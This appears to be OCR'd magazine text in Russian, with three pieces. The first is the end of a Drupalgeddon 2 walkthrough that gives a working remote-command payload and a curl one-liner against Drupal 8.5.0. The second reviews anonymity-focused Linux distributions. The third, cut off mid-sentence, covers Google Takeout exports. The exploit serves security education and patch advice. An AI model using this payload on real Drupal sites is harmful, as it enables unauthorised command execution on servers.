71:     foreach ($parents as $parent) {
72:       if (is_array($ref) && (isset($ref[$parent]) || array_
key_exists($parent, $ref))) {
73:         $ref = &$ref[$parent];
74:       }
75:       else {
76:         $key_exists = FALSE;
77:         $null = NULL;
78:         return $null;
79:       }
80:     }
81:     $key_exists = TRUE;
82:     return $ref;
83:   }

А затем на основе полученных данных выпол няется рендеринг полученного
массива.


/core/modules/file/src/Element/ManagedFile.php
193:     $output = $renderer‐>renderRoot($form);


/core/lib/Drupal/Core/Render/Renderer.php
129:   public function renderRoot(&$elements) {
130:     // Disallow calling ::renderRoot() from within another ::
renderRoot() call.
131:     if ($this‐>isRenderingRoot) {
...
138:     $output = $this‐>executeInRenderContext(new RenderContext(),
 function () use (&$elements) {
139:       return $this‐>render($elements, TRUE);
140:     });

Теперь давай воспользуемся отладчиком и проана лизируем, что происходит.
Поставим пре рывание на вызов NestedArray::getValue.


/core/modules/file/src/Element/ManagedFile.php
176:     $form_parents = explode('/', $request‐>query‐>get('elemen
t_parents'));
...
179:     $form = NestedArray::getValue($form, $form_parents); # вы
здесь





       Отладка метода uploadAjaxCallback после загрузки аватара

Массив $form_parents, полученный из параметра element_parents, служит
своеобразным путем к нужному элементу в $form для последующе го рен‐
деринга. В моем случае он выг лядит как $form["user_picture"]["widget"]
[0]. Ключи разделяются слешами, прямо как в настоящих путях Unix.
   Никто тебе не мешает указать свой путь до нуж ного эле мента, осталось
его только найти. И обра ти внимание на те поля, которые можно ввести
в форме регистрации пользователя, а именно на mail и name. Параметр name
фильтрует пользовательские данные, а вот mail лоялен к таким делам. Поп‐
робуем переде лать этот параметр в массив и передать в качестве ключа
строку, начинающуюся с решетки.





            Инъекция атрибута в значение параметра mail


$form => Array
(
    ...
    [account] => Array
    (
        [#type] => container
        [#weight] => ‐10
        [mail] => Array
            (
            [#type] => email
            [#title] => Drupal\Core\StringTranslation\TranslatableMar
kup Object
            ...
            [#name] => mail
            [#value] => Array
                (
                    [#test] =>
                )
            ...
            )
    )
)

Теперь, если мы укажем в element_parents значение account/mail/#value
и поставим пре рывание пос ле того, как отработает метод NestedArray::
getValue, получим в результате обновленный $form с нашими параметрами.





      Внедрение произвольного элемента и переназначение $form

Теперь вспоминаем волшебный атрибут #post_render и делаем мас‐
сив‐пейлоад на его основе. Сама функция для выполнения указывается
в качестве первого элемента массива.


mail[#post_render][] = 'exec'

Дальше нужно указать парамет ры для запус ка. Посмотри на вызов cal‐
l_user_func, и увидишь, что они берутся из элемента #children.


/core/lib/Drupal/Core/Render/Renderer.php
500:     if (isset($elements['#post_render'])) {
501:       foreach ($elements['#post_render'] as $callable) {
...
505:         $elements['#children'] = call_user_func($callable, $
elements['#children'], $elements);

Поэтому туда их и запишем.


mail[#children] = 'uname ‐a'

Теперь отправим получившуюся форму.





                 Все готово для экс плуатации RCE

И результат не заставит себя ждать! ;‐)





          Успешно отра ботавший RCE‐эксплоит для Drupal 8.5.0

Теперь выкинем все лишнее из запроса и оформим это в виде однострочной
команды curl.


$ curl ‐s ‐X 'POST' ‐‐data 'mail[%23post_render][]=exec&mail[%23chil
dren]=pwd&form_id=user_register_form' 'http://drupal.vh/user/
register?element_parents=account/mail/%23value&ajax_form=1'

Элегантно и просто!


ВЫВОДЫ
Ну как тут можно подыто жить? Первые звоночки об этой проблеме проз‐
вучали еще в конце прошлого года, когда исследова тель под ником WhiteWin‐
terWolf опубликовал пост у себя в бло ге о еще одном возможном сценарии
эксплуатации Drupalgeddon. Напомню, что в оригина ле эта уяз вимость поз‐
воляла  неавторизованному  пользователю  выполнить  SQL‐инъекцию.
WhiteWinterWolf же показал на ее примере, как ее мож но превратить в удален‐
ное выполнение команд при помощи манипуляции все с теми же плей схол‐
дерами в массиве.
  Проблема критич на для всех владельцев сайтов на Drupal, им стоит при‐
готовиться  к массовым  ата кам. Наверняка злоумышленни ки уже взяли
на вооружение экспло ит, поэто му в срочном порядке пишем правила
для WAF’ов и накатываем патчи. Кстати, если не хочешь обновляться, в офи‐
циальном анонсе разработчики выложили пат чи для всех актуальных веток
продукта. Хотя я все же нас тоятельно рекомендую поставить последние вер‐
сии CMS. Для ветки 7.x это Drupal 7.58, а для 8.x — Drupal 8.5.1. Там уяз‐
вимость исправлена.
  Или опять нет?
  ПРИВАТНОСТЬ
 ОС





                                                    84ckf1r3
                                                   84ckf1r3@gmail.com
   МАКСИМАЛЬНОЙ
     СЕКРЕТНОСТИ



ВЫБИРАЕМ ДИСТРИБУТИВ ДЛЯ ОБХОДА БЛОКИРОВОК
           И ЗАЩИТЫ ОТ СЛЕЖКИ



  Возможно, ты уже пользовался дистрибутивом Tails или даже
   запускаешь его ежедневно. Но это не единственная опе‐
   рационка,  способ ная  скрыть  твое  присутствие  в  сети
   и помогающая обойти региональные блокировки. В этой
   статье мы изучим пять конкурентов Tails, каждый — со сво‐
  ими интересными особен ностями.


             WARNING

                        Длительная и полная анонимность практически
                          недостижима на прак тике. Более того, настой‐
                          чивые попытки ее добиться гарантированно прив‐
                             лекут к тебе внимание. Подробнее см. проект
                             XKeyscore. О нем и его наследии в NSA и GCHQ
                       можно почитать на onion‐ресур сах.



  СОСТАВЛЯЮЩИЕ ПРИВАТНОСТИ
   Опытный хакер‐линуксоид самостоятельно сделает опе рационку под свои
   нужды, нафарширует ее любимыми инс трументами и зашифрует каждый бит.
   Однако это займет уйму времени, а потому данный способ подходит лишь
   самым красноглазым. Для всех остальных есть готовые варианты, в которых
   уже продуманы тысячи мелочей, собраны и настроены проверенные средства
   защиты приватности.
     При внешнем разнооб разии эти дистри бути вы имеют много общих черт,
   поскольку сохранение тайны личной жизни построено на одинаковых под‐
    ходах. Обеспечение приватности сос тоит из следующих этапов, которые
   решаются на локальном и сетевом уровне:
    • гарантированное уда ление следов работы и любых уникальных (а зна‐
       чит — потенциально компрометирующих) данных, использованных во вре‐
     мя сеанса;
    • шифрование тех данных, которые нужно сохранить (например, электрон‐
      ные кошельки, документы, аудиовидеозаписи, прочие личные файлы
      и конфиги);
    • сокрытие самого факта хранения зашифрованных данных (методами сте‐
       ганографии и их маскировкой среди более заметных криптоконтейнеров,
      заведомо не содержащих ценной информа ции);
    • изоляция приложений и выделение некоторых сервисов в отдельные вир‐
       туальные машины (sandbox, Xen, VirtualBox и другие средства виртуали‐
      зации) для снижения вероятности деано нимизации при зараже нии тро‐
      яном;
    • патчи ядра для усиленного контро ля за вза имодействием процессов
      и сведения к минимуму риска деано нимизации через эксплоиты;
    • средства экстренного завершения работы ОС с быс трым удалением
      наиболее компрометирующих данных на случай угрозы физического изъ‐
       ятия загрузочного накопителя;
    • ранняя подмена MAC‐адреса сетевых устройств (обычно она происходит
     еще на этапе загрузки);
    • предотвращение раскрытия IP‐адреса (контроль состояния VPN, anti DNS
        leak, фильтрация скриптов, использование цепочки прокси‐серверов
      с высокой анонимностью, проксирова ние тра фика всех при ложе ний через
       Tor и т. п.);
    • реализация анонимных каналов связи (чаты, почта, обмен фай лами);
    • обход  региональных блокировок  (автоматическая нас тройка  исполь‐
      зования публичных DNS‐серверов, бес платных VPN, быс трых прокси, Tor,
         I2P, Freenet).

   Разумеется, каждый конкретный дистрибутив имеет свои ограниче ния и не
   предоставляет все перечисленные выше инстру менты в одной сборке, но это
   и не требуется на практике. Многие пункты в данном списке дублируют фун‐
   кциональность друг друга либо вовсе вза имоисклю чающи.


               INFO

                   Мы не будем рассуждать о человеческом фак‐
                              торе, который сводит на нет надежность любой
                           системы. Ограничимся техническими аспектами
                         и просто напомним, что не существует средств,
                          полностью  запрещающих  людям  совершать
                       ошиб ки.



   KODACHI
   В прошлом выпуске мы раз бирали дистри бути вы для форензики, а Kodachi
   позиционируется как anti‐forensic‐раз работка, затрудняющая криминалис‐
    тический анализ твоих накопителей и оперативной памяти. Техничес ки
    это еще один форк Debian, ориентированный на приватность. В чем‐то он
   даже более про думан, чем популярный Tails.
     Последняя стабильная версия Kodachi 3.7 была написана в январе прош‐
   лого года. Операционка родом из Ома на (где с интернет‐цензурой знакомы
   не понаслышке), что добавляет ей колори та.
     В качестве среды рабочего стола для Kodachi была выбрана Xfce, а общий
   интерфейс операционки стилизован под macOS. Статус подключения к Tor
   и VPN, а также большинство текущих парамет ров загрузки системы выводятся
    в режиме реального времени и отображаются прямо на рабочем столе.





                      Графичес кий интерфейс Kodachi

   Среди ключевых особен ностей Kodachi — принудительное туннелирование
    трафика через Tor и VPN, причем бесплатный VPN уже настроен.





                          Запуск Kodachi VPN

   Плюс в Kodachi интегрирова на поддержка DNScrypt — это протокол и одно‐
   именная утилита, шифрующая запросы к серверам OpenDNS методами
   эллиптической криптографии. Она устра няет целый ряд типичных проблем,
   вроде DNS leak и оставления следов работы в сети на серверах провайдера.





                               Kodachi DNS tools

   Другое отличие Kodachi — интегрированный Multi Tor для быстрой смены
   выходных узлов с выбором определен ной стра ны и PeerGuardian для сок‐
   рытия своего IP‐адреса в Р2Р‐сетях (а также блокировки сетевых узлов
   из длинного черного списка).





                                  PeerGuardian

   Помимо PeerGuardian, в качестве брандмауэра используется Uncomplicated
    Firewall (uwf) с графической обо лочкой guwf.
     Приложения в Kodachi легко изолировать при помощи встроенной песоч‐
   ницы Firejail (о ней мы уже рас ска зывали). Особенно рекомендуется делать
    это для браузера, поч ты и мес сенджера.





                                                Firejail sandbox

   Операционка плотно нафарширова на средствами криптографии (TrueCrypt,
    VeraCrypt, KeePass, GnuPG, Enigmail, Seahorse, GNU Privacy Guard Assistant)
   и заметания следов (BleachBit, Nepomuk Cleaner, Nautilus‐wipe).





                    Набор предус тановленных ути лит





                     Встроенные системные приложения

   В Kodachi реализована защита от атаки методом холодной перезагрузки.
   Во время cold boot attack можно час тично восста новить данные, недавно
    (секунды назад) хранившиеся в оперативной памяти. Чтобы этого избежать,
    Kodachi затирает оперативную память случайными данными при выключении
   компьютера.
     Инструменты быстрого реагирования соб раны в раз деле Panic  room.
   В нем есть программы затирания данных на дис ке и в оперативной памяти,
   перезапуска сетевых подключений, блокировки экра на (xtrlock) и даже коман‐
   да полного уничтожения операционки.





                          Набор параноика

    Kodachi  работает  с  USB‐Flash  как  типичный  Live‐дистрибутив  (чтобы
   не оставлять следов на локальном компьюте ре), но при желании ты можешь
    запустить ее в виртуалке (если доверяешь основной ОС). В любом случае
   по умолчанию ты логинишься как пользователь с именем kodachi и паролем
   r@@t00. Чтобы использовать sudo, введи username root и такой же пароль
   r@@t00.


  MOFO LINUX
   Это быстро развивающаяся и солидно нафаршированная ОС на базе Ubuntu.
   Прямо «из коробки» она предлагает SoftEther VPN и OpenVPN с автоматичес‐
   ким определением пятнадца ти самых быс трых (не обя зательно ближайших
    к тебе) бесплатных серверов. Указывается их пинг до тебя, до сайта google.‐
   com и пропускная способность канала.





                          Нас трой ка OpenVPN

   Помимо Tor и VPN, MOFO поддерживает I2P плюс Lantern и Psiphon, как шус‐
   трые прокси. Правда, сейчас Psiphon глю чит, а у Lantern без ограничения ско‐
   рости на бесплатном тарифе доступно только 500 Мбайт в месяц, но всегда
   можно купить платный аккаунт.





                                  Lantern в MOFO

   Прямо  из  графического меню  в  пару  кликов  устанавливается  клиент
    Freenet — одноранговой анонимной сети с распределенным хранением
   зашифрованных данных. В ней есть свои сайты и форумы, которые прак‐
    тически невозможно цензурировать.





                                      Freenet

   В MOFO добавлена ссылка на установку пакета поддержки распределенной
   файловой системы IPFS (Interplanetary File System), созданной на основе тех‐
   нологий P2P. Благодаря IPFS можно расшаривать локальные фай лы и соз‐
    давать сайты, которые не исчезнут из‐за блокировок (об IPFS мы тоже уже пи‐
   сали). MOFO также поддерживает сетевой протокол Cjdns. С его помощью
   можно создать виртуальную IPv6‐сеть с шифровани ем трафика.





                              Ус тановка IPFS

   Криптографическую защиту личных данных в MOFO обеспечивает eCryptfs —
   многоуровневая файловая система с шифрованием на лету. Она работает
   поверх существующей ФС (ext3, ext4 или XFS) и не тре бует соз дания спе‐
   циального раздела.





                        Включаем шифрование

   Дополнительно в MOFO предус тановлена утилита ZuluCrypt с поддержкой
   формата криптоконтейнеров TrueCrypt и VeraCrypt.





                    ZuluCrypt — варианты зашифрованных томов

   На момент тестирования была дос тупна вер сия mofolinux‐6.0 от 18 фев‐
   раля 2018 года. По умол чанию пароль администра тора не задан.


  SUBGRAPH OS
   Об этой операционке мы писали в 2016 году, и с тех пор мало что изме‐
    нилось. Это все еще очень сырой форк Debian, который однажды похвалил
   Сноуден за идею, но не за реализацию. Единственное, что в Subgraph замет‐
   но изменилось, — это перечень предус тановленного софта.





                Ин тегрированные утилиты в Subgraph OS

   Последняя версия сейчас — сентябрь ская альфа 2017 года. Она может
    запускаться в Live‐режиме, но для полноценной работы пред полагает уста‐
   новку на жесткий диск.
     Ключевая особен ность Subgraph OS — система запус ка приложе ний
    в песочницах Oz. Она изолирует выбранные приложения друг от дру га и от
   основной системы с помощью пространств имен и накладывает ограничения
   с помощью seccomp‐bpf, так же как это делает уже упомянутый Firejail.
     Ядро Subgraph OS соб рано с патчами PaX/Grsecurity. Они ограничивают
   доступ к файлам /proc, применяют более жес ткую изоляцию chroot(), вклю‐
   чают в себя более продвинутую систему рандомизации адресного прос‐
   транства ASLR, помечают стек как неисполня емый и контролируют выделение
   сетевых сокетов.
      Subgraph OS устанавливается на зашифрованный раз дел, имеет средства
   для разрешения/запрета доступа приложений к сети, под держивает аппарат‐
   ные клю чи YubiKey с одноразовыми паролями.





                            YubiKey PT в Subgraph OS

   Электронная поч та защищена с помощью PGP, а встроенный брандмауэр
   маршрутизирует все исходящие соединения через анонимную сеть Tor.
     Интегрированный Subgraph OS Instant Messenger — это форк CoyIM с под‐
   держкой XMPP, который также работает через Tor по умол чанию.





                   Анонимный мес сенджер Subgraph OS



                                          Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ
  ОС МАКСИМАЛЬНОЙ
       СЕКРЕТНОСТИ
             ВЫБИРАЕМ ДИСТРИБУТИВ ДЛЯ ОБХОДА
              БЛОКИРОВОК И ЗАЩИТЫ ОТ СЛЕЖКИ




Создание анонимных файловых шар доступно через OnionShare, но точно так
же утилита работает и в дру гих версиях Linux.





                       OnionShare в Subgraph OS

На первый взгляд может показать ся, что в Subgraph OS все хорошо и это дей‐
ствительно достойная ОС, но на самом деле все намного сложнее. Во встро‐
енной песочнице запускаются только определенные приложе ния. Есть список
приложений, которые авто матически попадают в sandbox, остальные, вклю‐
чая рабочую среду GNOME, запус каются как обычные приложе ния в любом
другом дистрибутиве Linux.
   Такая архитектура открывает множество путей для компрометации ОС.
Например, Tor Browser запус кается в песочнице, но имеет полный дос туп
к каталогу ~/Downloads (для сохранения загруженных файлов). Если в бра‐
узере будет обнаружена дыра и взломщик найдет способ ее использовать
для запуска эксплоита, он сможет записать в ~/Downloads все, что захочет,
вклю чая, например, файл формата .desktop. В такой файл можно помес тить
любой скрипт, и он будет исполнен, когда пользователь перейдет в каталог
~/Downloads и кликнет по нему. А так как для навигации по ФС в Subgraph OS
используется работающий вне песочницы файловый менед жер Nautilus, то
скрипт будет иметь доступ ко всей системе.
  В апреле 2017 года этим недоразумением воспользовалась Micah Lee
и Joanna Rutkowska (соз дательница Qubes OS), выполнив показательный хак
Subgraph OS.


HEADS
Сравнительно новая операционка называ ется именно так — heads со строч‐
ной буквы. В FAQ по этому поводу написа но краткое пояснение разработчика:
«потому что я так сказал». Остальные ответы в нем не более содержательные.
Проект молодой, развивается на голом энтузиаз ме, и потому документации
не хватает.
  На момент написания статьи на официальном сайте была доступна вер‐
сия 0.4 от 26 марта 2018 года. Техничес ки это форк на основе Devuan,
который, в свою оче редь, форк Debian с демоном ини циализации SysVinit
вместо SystemD.
   Heads поддерживает только процессорные архитектуры  i386, x86_64,
поэтому не подой дет для использования на мобильных девай сах с процес‐
сорами ARM. В качестве гра фической оболочки в heads пред лагается тай‐
ловый  оконный менеджер Awesome,  в котором реализовано быстрое
управление окнами с клавиатуры. В качестве более привычной альтернативы
доступен Openbox.
  Набор утилит в heads очень скромный. Есть браузер, почта, чат, крип‐
товалютный кошелек и по паре прог рамм для работы с разными типами фай‐
лов.





                   Минимализм heads

С другой стороны, из‐за легковесности Tor запускает ся очень быстро, а бра‐
узером можно пользоваться практически сразу.





                               Tor‐бра узер

Ключевые особенности heads — глубокая интеграция с Tor и использование
только свободного прог раммного обеспечения. Весь трафик (а не только
браузерный) в heads идет через Tor. Сайт heads также дос тупен в Tor.
  Дополнительно heads может подменять MAC‐адрес при старте, а модуль
ядра Permakey авто матически завершает работу ОС при изъятии загрузочной
флешки (полезно на случай спешного ухода). Отклю чить такое поведение
можно, отметив соот ветс твующие флажки при старте операционки. Там же
при старте задается пароль администра тора.





                         Запуск heads

По умолчанию внешние накопители не подклю чаются. В Openbox они мон‐
тируются по клику на значке утилиты udiskie в нижней панели справа. Опе‐
рационка находится на раннем этапе развития, поэтому недоделок в ней хва‐
тает. Проблемы возникают уже с поиском драй веров для виде окарт, сетевых
адаптеров и другого железа. Если тебе повез ло с конфигом, то heads быстро
запустится в Live‐режиме и пус тит тра фик всех при ложений через Tor.
  Однако это не всегда нужно. Например, при использовании HexChat нель‐
зя подключиться ко многим популярным каналам. Они видят попытку залоги‐
ниться через выходные узлы Tor и автомати чес ки кикают тебя.





                       Локи не рад Тору

В heads есть очень краткий список ресурсов в Tor, но их легко найти самос‐
тоятельно.





                    Некото рые адреса в Tor


TAILS
Tails (The Amnesiac Incognito Live System), пожалуй, самая извес тная операци‐
онка для анонимного веб‐серфинга и обхода интернет‐цензуры. Мы не раз
писали о ней, поэтому не будем сейчас уделять ей много внимания. В час‐
тности, на страницах ][ рас сказывали о том, как установить Tails на флешку
и как использовать VirtualBox в Tails. Сей час же в обзор попала свежая вер‐
сия 3.6.2 от 11 апреля 2018 года.
   Технически Tails — это ирландский форк Debian (на основе стабильной
ветки) с GNOME в качес тве графичес кой среды. Tails поддерживает рус ский
язык, умеет настраивать разные способы подклю чения к Tor и под менять
MAC‐адрес сразу при старте.





                    Парамет ры запуска Tails

Автоматическая настрой ка Tor занимает нес колько минут, но зато легко кон‐
тролируется через Onion Circuits.





                 Наглядная луковичная маршрутизация

Обновления Tails выходят регулярно, и в основном это патчи безопасности.
В каждой версии обнаруживается масса уяз вимос тей, и быстро выпускают
новую — все в традициях циклической раз работки.
  Примечательно, что Tails детектит запуск в вир туал ке и предупреждает, что
в таком случае не гарантиру ет анонимность, поскольку не может ручаться
за безопасность основной ОС.
  Набор предустановленных программ в Tails средний по раз меру (когда‐то
он был совсем минималистичным), но ты всегда можешь доус тановить любой
софт из репозиториев Debian. Но это зай мет много вре мени (из‐за его заг‐
рузки через Tor), а после завершения сеанса все изме нения пропадут (если,
конечно, ты не создашь зашифрованный раздел на флешке с помощью
встроенной утилиты).
  Все данные хранятся в оперативке и не сохраняются на диске, чтобы
не оставлять сле дов (опять же если ты не исполь зуешь зашифрованный раз‐
дел). При выключении Tails забьет ОЗУ случайными данными, чтобы не допус‐
тить их считывания при атаке методом холодной перезагрузки. Защита
от внезапного выдергивания флешки, рандомизация MAC‐адреса сетеву хи
(работает и для внешних сетевых карт) также при сутству ют. Весь трафик,
в том числе DNS‐запросы, идет исключительно через Tor.
  Для сов мес тной анонимной работы в режиме реального вре мени в Tails
интегрирована утилита Gobby. Она поддержи вает Unicode, подсветку син‐
таксиса популярных языков прог рамми рова ния и выделение цве том фраг‐
ментов текста, добавленных раз ными пользователями. Ее версии также дос‐
тупны для Windows и macOS.





                Совмес тная ано нимная работа в Tails

Несмотря на солидный воз раст (проекту уже почти девять лет), Tails до сих
пор подвержена странным глю кам. Например, при чтении новостей через Lif‐
erea временами с экрана пропада ет ее поисковая выдача или вовсе завер‐
шаются все приложения. Происходит это не постоянно, и отловить взаимос‐
вязь с какими‐то определенными действиями нам пока не удалось.





                     Новос ти без цензуры


WHONIX
Пожалуй, это наименее тривиальная операционка в сегодняшнем обзоре.
Она поставляется в виде готовых виртуальных машин (.ova) и состоит из двух
взаимосвязанных частей.
  Серверная часть называется Whonix‐Gateway, а клиентская — Whonix
Workstation. Последний ста бильный релиз был выпущен 31 мая 2016 года.
По умолчанию в Whonix задано имя пользователя user и пароль changeme.
  Для использования Whonix нужно ска чать обе виртуал ки, импортировать
их конфиги средствами VirtualBox и поочередно запус тить, начиная с Gateway.
Много ресурсов им не требует ся. Оптимальные параметры уже заданы.





               Импортируем виртуалки Whonix

Дальнейшая настрой ка выполняется при помощи мастера в нес колько кли‐
ков. Колдовать в консоли не потребуется.





                    Нас трой ка Whonix‐Gateway

Серверная часть возьмет на себя маршру тиза цию через Tor и VPN, обработку
запросов DNS и фильтрацию сетевых пакетов.





              Раздвоение виртуальной личности с Whonix

Такой подход позволяет скрыть все данные пользователя на одной виртуаль‐
ной машине, в то время как ата кам подвергается дру гая — Gateway. Заодно
так решается известная проб лема деанонимизации. Нет риска утечки реаль‐
ного айпишника из‐за DNS leak и глюков маршру тизации.





                      Статус подключения к Tor

Даже если серверную часть Whonix взло мают, атакующий не вычислит твой
айпишник и не доберется до твоих документов и биткойнов, поскольку они
хранятся в другой (клиентской) виртуалке.
  Список предустановленных программ у Whonix довольно стандартен: бра‐
узер Tor, мессенджеры Tor Messenger, Tox и Ricochet, почтовые клиенты Mozil‐
la Thunderbird и TorBirdy с поддержкой PGP, безопасная передача файлов
через SCP (RCP через SSH) и системные ути литы. Полный список с раз‐
бивкой по категориям смотри здесь.
   Как и у всякой вир туалки, надеж ность Whonix зависит от степени защищен‐
ности основной операционной системы. Ее можно запустить на компьюте рах
с Windows, macOS или Linux.





                    Варианты запус ка Whonix

Одним из самых надежных вариантов счи тает ся запуск Whonix в Qubes OS
на доверенном железе с эталонной прошивкой. Это форк Fedora от Йоанны
Рутковской, использующий гипервизор Xen. Данная операционка не относит‐
ся к Live‐дистрибутивам и потому не рассматрива ется в текущем обзоре.
Однако ее принципиальное устройство уже описыва лось ранее на страницах
«Хакера».


ВЫВОДЫ
Среди дистрибутивов для ано нимного веб‐серфинга и обхода интернет‐цен‐
зуры есть как очень разрекламированные (Tails, Subgraph OS), но не слишком
удобные, так и менее известные, но более функциональные (MOFO, Kodachi).
Именно на последние я советую обратить внимание при выборе Live OS.
  В данный обзор не попали дистрибутивы, разработка которых была при‐
остановлена два года назад или более. Это JonDo, Sabayon Linux, благос‐
ловленный АНБ TENS, Discreete Linux, IprediaOS и многие другие. Это не зна‐
чит, что они плохие, просто сейчас появились более актуальные, а свой форк
анонимного линукса не делал только ленивый.


        WWW

                    •Про анонимность и псевдонимность
                    •Десять   советов  по  использованию  VPN
                           от MOFO Linux
                     •Справочник по Subgraph OS
ПРИВАТНОСТЬ
ВЫНОСИМ

КАКИЕ ДАННЫЕ О НАС
ХРАНИТ GOOGLE
И КАК ИХ ВЕРНУТЬ СЕБЕЧЕРЕЗ TAKEOUT   ВСЁ!





  Андрей Письменный
      Шеф‐редактор
   apismenny@gmail.com





Как известно, Google хранит огромное количество данных
о своих поль зователях, чем его неп рерывно попрекают.
Под напором критики в Google создали механизм, который
позволяет взять и выкачать все свои данные. Этот сервис
называется Takeout, и у него могут быть раз ные интересные
применения, о которых мы и погово рим. А заодно детально
изучим то, что он выда ет на руки пользователю.


Причины взять и забрать всё могут быть раз ными. Например, ты хочешь миг‐
рировать на другой сервис и перенес ти туда свои данные: без конвертации
вряд ли обойдется, но иног да это оправданная морока. Или, может быть, ты
хочешь сделать какую‐то ана литическую систему в духе лайфлоггинга и quan‐
tiﬁed self и тебе в этом помогут накопленные в Google данные. Или страна,
в которой ты живешь, вдруг решила отгородить свой интернет каким‐нибудь
великим файрволом, после чего Google ока жется за бортом. Увы, бывает
и такое.
  Я за последние двенадцать лет немало пользовался продуктами Google,
тестируя многие из них в рамках обзо ров, и никог да не выключал сле дящие
механизмы. Возможно, ты ска жешь, что это безумие, но, во‐первых, Google
относится к моим данным бережно и причин для паники пока не давал,
а во‐вторых, я ни в коем случае не пропагандирую такой подход. Так что счи‐
тай, что я терплю этот кошмар, чтобы тебе не пришлось! :‐)
   Итак, чтобы получить свои архивы, нужно зай ти в окошко по адресу take‐
out.google.com, выставить галочки напротив интересу ющих тебя сервисов
и подождать некото рое (ощутимое) время. Когда я запросил полный архив,
ссылка пришла через день, то есть больше чем через 24 часа. В письме
робот Google бодро сообщил, что данные соб раны по 36 продуктам, занима‐
ют 63,6 Гбайт и разбиты по трем архивам. При чем основной объ ем пришел ся
на первые два, а третий оказался зазипованной стра ницей с каталогом все го
выданного.





Если не хочешь качать такие объемы, то заказы вай частичные архивы,
которые будут вклю чать не все сервисы. Нап ример, если выключить Photos,
YouTube и Gmail, а также Drive, если ты там хранишь что‐то помимо тестовых
документов, то может получиться всего несколько сот мегабайтов. Кстати,
чем меньше архив, тем быстрее приходит ссылка на скачивание.


ПОИСК
Начнем с одной из самых занимательных вещей — истории поисковых зап‐
росов. Она лежит в папке Searches и разбита на файлы по три месяца,
к примеру 2006‐01‐01 January 2006 to March 2006.json. Если откроешь
один из них, то увидишь, что информа ция о каж дом запросе сос тоит всего
из двух вещей: времени в формате Unix и искомой строки.
  Для перевода времени можно использовать какой‐нибудь он лай новый
конвертер, а если нужно будет сконверти ровать массово, то это делается
одной строкой на Python (замени сло во «время» на свое значение):


datetime.datetime.fromtimestamp(int("время")).strftime('%d‐%m%‐%Y %H:
%M:%S')

Но подробным анализом я предлагаю тебе заняться самос тоятельно. Мы же
забавы ради попробуем поискать вхож дения тех или иных строк при помощи
grep. Поскольку данные сохранены в JSON, их сна чала нужно будет скон‐
вертировать в строки — я для этого использовал ути литу gron, о которой не‐
давно писал в рубрике WWW.
   Если у тебя установлен gron, можешь написать что‐то в таком духе:


$ for F in *; do cat "${F}" | gron | grep "xakep"; done

И увидишь все свои запросы со сло вом xakep за все время. Какие еще клю‐
чевики можно попробовать? Ну например, сло во «скачать». :‐) Или вот занят‐
ная идея: если поискать символ @, то ты найдешь все почтовые адреса
и аккаунты Twitter, которые ты пробивал через Google.
  Обрати внимание, что здесь нет поиска по картинкам и видео, но мы их
еще обнаружим в папке My Activity.


        WWW

                       Пост о том, как сконвертировать исто рию зап‐
                       росов в Excel и потом анализировать



ЧАТЫ
Возможно, у тебя уже где‐то спря тана папка со ста рыми логами ICQ и ты бы
хотел присовокупить к ней еще и все когда‐либо написанное через Google
Talk и Hangouts. Это вполне реально, но, к сожалению, читать перепис ку в том
виде, в котором она приходит из Takeout, практичес ки невоз можно (в отли‐
чие, кстати, от логов ICQ).
   Весь текст экспор тиру ется как единственный файл JSON плюс горка при‐
ложенных картинок — все это лежит в пап ке Hangouts. С картинками никаких
проблем, а вот в JSON на каждое написанное сооб щение приходится поряд‐
ка двух десятков строк метаданных. Но пожалуй, главная головная боль —
в том, что вместо имени отпра вителя здесь ID пользователя.
  Наверное, самое прос тое, что мы можем сделать, — это выкинуть всю
мишуру и оставить только текст. По крайней мере можно увидеть какие‐то,
пусть и обезличенные, беседы.


$ gron Hangouts.json | grep '.text'

Так хотя бы есть шанс что‐то выловить.


GOOGLE+
Что действительно есть смысл бэкапить — это посты из социальной сети
Google+, которая стремительно становится артефактом прошлого. Если ты,
конечно, вообще когда‐либо ей пользовал ся.
  Данные поделены на три папки: Google+ Stream, Circles и Pages. Давай
заглянем в них по порядку.
   Circles — это контакты людей, организованные по «кругам» из Google
Plus. Формат — vCard (VCF) с той информацией, которую люди сами о себе
запол нили. Можно при желании одним махом импортировать в любую
адресную книгу.
  Папка Pages будет присутствовать в том случае, если у тебя имелись пуб‐
личные страницы. Но ничего интерес ного там  нет, разве что юзерпик
и обложка страницы.
   Также к данным Google+ стоит отнести папку Profile. В ней содержится
JSON с копией всех тех данных, что ты запол нил о себе в этой соцсети.
Основные интересные вещи лежат в структурах urls (ссыл ки на другие про‐
фили в соцсетях) и organizations (места работы с датами). Забавная
деталь: при том, что у меня в профиле не ука зан возраст, здесь присутс твует
поле "ageRange": {"min": 21}, значение которого Google, кажется, опре‐
делил самостоятельно.
  Самое глав ное ты найдешь в папке Google+ Stream. Здесь в качестве
отдельных HTML свалены все твои посты с комментариями и даже отдельные
комментарии. Можно полис тать и понос тальгировать, а можно парой строк
на Python с BeautifulSoup выдрать, к примеру, толь ко тексты постов. Выбирать
нужно будет элементы с классами entry‐title и entry‐content.
  К сожалению, картинки из постов не бэкапятся автоматичес ки — они так
и остаются ссылками на сервер Google, который еще и не отдаст их без авто‐
ризации. Недоработочка!


КАРТЫ
Еще одна большая и важная категория личных данных. Начнем с прос того —
папки MyMaps. Это маршруты, созданные тобой в Google Maps, — по одно‐
му файлу KMZ на маршрут.
  KMZ — это фор мат Google Earth, который поддерживается и в других кар‐
тографических приложениях. Ну а по сути это ZIP, в котором лежит файл KML,
являющийся валидным XML. Если для твоих целей это по каким‐то причинам
не подходит, можешь воспользовать ся сервисом GeoConverter и сконверти‐
ровать его, например, в GeoJSON, работать с которым слегка попроще.
  Папка Maps (your places) содержит один файл — Saved Places.json.
В нем собраны все твои закладки из Google Maps в виде очередной заковы‐
ристой структуры. Каждая из закладок — это элемент массива features,
у которого есть заголо вок, дата добавления, дата изменения и ссыл ка
на Google Maps. А вот геокоординаты могут быть записаны по‐разному:
как поле geometry с массивом coordinates или как Location с полями Lat‐
itude и Longitude, но оно же (чтобы жизнь медом не казалась) может
называться, например, Geo Coordinates. В общем, при желании учесть все
эти особенности не слишком тяжело, но могло бы быть и попроще.
  Наконец, самая занима тельная папка — это Location History — файл
со всей историей твоих перемещений с мобиль ным телефоном в кармане
за все время. У меня эти данные занимают 7,5 Мбайт.
  Файл устроен очень просто, особен но в сравнении с дру гими архивами.
Это огромный массив из структур, включающих в себя: время в формате Unix,
широту, долготу и точность определения. Иног да к ним добавляются (веро‐
